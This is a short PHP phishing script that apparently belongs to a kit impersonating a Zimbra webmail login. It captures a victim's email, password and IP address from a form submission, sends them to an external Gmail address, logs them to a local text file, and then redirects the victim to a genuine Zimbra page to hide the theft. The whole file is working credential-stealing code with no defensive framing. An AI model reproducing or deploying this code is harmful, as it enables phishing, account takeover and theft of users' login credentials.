<?php 
$ip = getenv("REMOTE_ADDR");
$message .= "---:||Zimbra Login ||:---\n";
$message .= "Email : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$message .= "----Crack By Solutionbc----\n";
$recipient = "atm9321901111@gmail.com";
$subject = " Zimbra Account-$ip";
$headers .= $_POST['$ip']."\n";

mail($recipient,$subject,$message);
$fp = fopen("results2.txt","a");
fputs($fp,$message);
fclose($fp);
####location:yoursite.com/ss.html so on use https for redirect ###
header("location: https://wiki.zimbra.com/wiki/Security_Center");

?>